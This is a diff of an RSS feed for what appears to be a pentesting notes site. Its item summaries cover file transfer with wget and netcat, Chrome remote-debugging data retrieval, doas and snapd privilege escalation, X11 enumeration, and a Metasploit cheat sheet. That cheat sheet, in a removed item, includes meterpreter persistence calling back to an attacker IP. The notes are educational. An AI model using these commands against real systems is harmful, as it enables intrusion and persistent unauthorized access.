@@ -16,13 +16,6 @@
       <description>Using Wget linkIn machine A, Start a web server.&#xA;python -m http.server # We can specify which directory to host by `--directory` option. python -m http.server --directory /usr/bin In machine B, download a file from the web server of machine A.&#xA;wget http://&amp;lt;ip-for-machine-A&amp;gt;:8000/example.txt # Download recursively # -r: recursive # -np: no parent # Don&amp;#39;t forget &amp;#34;/&amp;#34; after the directory name wget -r -np http://&amp;lt;ip-for-machine-A&amp;gt;/somedir/ Using Netcat linkTransfer a File linkIn machine A, start a listener for receiving a file.</description>
     </item>
     <item>
-      <title>Connect to Android Device from PC using SSH</title>
-      <link>https://documentnation.github.io/docs/hdks/mobile/android/connect-to-android-device-from-pc/</link>
-      <pubDate>Sun, 05 Nov 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/mobile/android/connect-to-android-device-from-pc/</guid>
-      <description>1. Preparation link1. Create SSH Private/Public Key Pair on Linux Machine linkIn our machine, we need to generate SSH key pair for connecting to SSH server of Android device.&#xA;After running the following command, there&amp;rsquo;s no problem with no passphrase if it&amp;rsquo;s for testing purpose.&#xA;ssh-keygen -t ed25519 -f id_ed25519_android After that, store the generated files (id_25519_android, id_25519_android.pub) into ~/.ssh folder.&#xA;# If `.ssh` directory does not exist, create a new one.</description>
-    </item>
-    <item>
       <title>Shell Scripting</title>
       <link>https://documentnation.github.io/docs/hdks/linux/management/shell-scripting/</link>
       <pubDate>Fri, 03 Nov 2023 00:00:00 +0000</pubDate>
@@ -156,13 +149,6 @@
       <description>Investigation link /usr/bin/google-chrome --remote-debugging-port=12345 If the target system is running Google Chrome Debugger with specific port, we can port forward and may be able to retrieve sensitive data in browser debugging mode.&#xA;Exploitation link1. Port Forwarding linkFirst off, start port forwarding in local machine.&#xA;ssh -L 12345:127.0.0.1:12345 remote-user@example.com 2. Configure Network Targets in Chrome linkAssume the chrome debugger is running on port 12345.&#xA;Open Chrome browser and input the following string in URL bar at the top of the window.</description>
     </item>
     <item>
-      <title>Doas Privilege Escalation</title>
-      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/doas/</link>
-      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/doas/</guid>
-      <description>Investigation linkFirst of all, search location of doas.conf.&#xA;find / -type f -name &amp;#34;doas.conf&amp;#34; 2&amp;gt;/dev/null Next check the configuration.&#xA;doas -C /path/to/doas.conf doas -C /etc/doas.conf # or cat /etc/doas.conf Execute doas as below.&#xA;doas -u root &amp;lt;command&amp;gt; &amp;lt;arg&amp;gt; Please also refer to GTFOBins to PrivEsc.</description>
-    </item>
-    <item>
       <title>Snapd Privilege Escalation</title>
       <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</link>
       <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
@@ -175,13 +161,6 @@
       <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/linux/protocol/x11-pentesting/</guid>
       <description>Enumeration link nmap --script x11-access -p 6000 &amp;lt;target-ip&amp;gt; msf&amp;gt; use auxiliary/scanner/x11/open_x11 </description>
-    </item>
-    <item>
-      <title>Metasploit Cheat Sheets</title>
-      <link>https://documentnation.github.io/docs/hdks/tool/metasploit-cheat-sheets/</link>
-      <pubDate>Sat, 07 Jan 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/tool/metasploit-cheat-sheets/</guid>
-      <description>Msfconsole linkNo content yet.&#xA;Meterpreter link # List all sessions running on background msf&amp;gt; sessions # Start interacting with the session msf&amp;gt; sessions &amp;lt;session-id&amp;gt; # Drop into a system command shell meterpreter&amp;gt; shell # Upgrade to full functional shell python3 -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Persistence at the target system # -h: Help meterpreter&amp;gt; run persistence -h # -U: Automatically start when the user logs on # -i: The interal in seconds between each connection attempt # -p: The port on which the system running Metesploit is listening # -r: The IP of the system running Metasploit listening for the connect back meterpreter&amp;gt; run persistence -U -i 5 -p 443 -r &amp;lt;local-ip&amp;gt; Msfvenom linkNo content yet.</description>
     </item>
   </channel>
 </rss>
